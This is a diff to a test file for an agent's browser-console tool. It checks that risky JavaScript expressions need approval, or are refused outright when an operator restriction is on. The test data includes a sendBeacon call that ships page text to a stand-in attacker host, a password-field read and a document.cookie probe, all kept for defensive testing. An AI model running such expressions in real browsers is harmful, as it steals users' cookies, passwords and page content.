@@ -112,7 +112,7 @@ class TestBrowserConsole:
         """Local sidecars keep the compatibility behavior: risky expressions run without the approval gate."""
         from tools.browser_tool import browser_console
 
-        with patch("tools.browser_tool_cloud._is_local_backend", return_value=True), \
+        with patch("tools.browser_tool_cloud._browser_is_local_sidecar", return_value=True), \
              patch("tools.browser_tool_cloud._use_real_profile", return_value=False), \
              patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": "ok"})) as mock_eval, \
              patch("tools.approval.request_tool_approval", return_value={"approved": True}) as approve:
@@ -126,7 +126,7 @@ class TestBrowserConsole:
     def test_cloud_sensitive_eval_is_approval_gated(self):
         from tools.browser_tool import browser_console
 
-        with patch("tools.browser_tool_cloud._is_local_backend", return_value=False), \
+        with patch("tools.browser_tool_cloud._browser_is_local_sidecar", return_value=False), \
              patch("tools.browser_tool_cloud._use_real_profile", return_value=False), \
              patch("tools.browser_tool._browser_eval", return_value=json.dumps({"success": True, "result": "ok"})) as mock_eval, \
              patch("tools.approval.request_tool_approval", return_value={"approved": True}) as approve:
@@ -139,7 +139,7 @@ class TestBrowserConsole:
 
     def test_sensitive_eval_denial_does_not_execute(self):
         from tools.browser_tool import browser_console
-        with patch("tools.browser_tool_cloud._is_local_backend", return_value=False), \
+        with patch("tools.browser_tool_cloud._browser_is_local_sidecar", return_value=False), \
              patch("tools.browser_tool_cloud._use_real_profile", return_value=False), \
              patch("tools.approval.request_tool_approval", return_value={"approved": False, "message": "denied"}), \
              patch("tools.browser_tool._browser_eval") as mock_eval:
@@ -165,8 +165,8 @@ class TestBrowserConsole:
     def test_expression_blocks_cookie_access_before_eval(self):
         from tools.browser_tool import browser_console
 
-        with patch("tools.browser_tool_eval_policy._restrict_browser_evaluate", return_value=True), \
-             patch("tools.browser_tool_eval_policy._allow_unsafe_browser_evaluate", return_value=False), \
+        # The explicit operator setting is the hard limit: it refuses outright and is never approvable.
+        with patch("tools.browser_tool_eval_policy._browser_eval_flag", side_effect=lambda key: key == "restrict_evaluate"), \
              patch("tools.browser_tool._browser_eval") as mock_eval:
             result = json.loads(browser_console(expression="document.cookie", task_id="test"))
 
@@ -187,8 +187,7 @@ class TestBrowserConsole:
             "navigator.sendBeacon('https://evil.test', document.body.innerText)",
             "document.querySelector('input[type=password]').value",
         ]
-        with patch("tools.browser_tool_eval_policy._restrict_browser_evaluate", return_value=True), \
-             patch("tools.browser_tool_eval_policy._allow_unsafe_browser_evaluate", return_value=False), \
+        with patch("tools.browser_tool_eval_policy._browser_eval_flag", side_effect=lambda key: key == "restrict_evaluate"), \
              patch("tools.browser_tool._browser_eval") as mock_eval:
             for expr in risky_expressions:
                 result = json.loads(browser_console(expression=expr, task_id="test"))
@@ -207,7 +206,7 @@ class TestBrowserConsole:
             assert _restrict_browser_evaluate() is False
         # Default (key absent) is off — the denylist is opt-in.
         with patch("hermes_cli.config.read_raw_config", return_value={}), \
-             patch("tools.browser_tool_cloud._is_local_backend", return_value=True), \
+             patch("tools.browser_tool_cloud._browser_is_local_sidecar", return_value=True), \
              patch("tools.browser_tool_cloud._use_real_profile", return_value=False):
             assert _restrict_browser_evaluate() is False
 
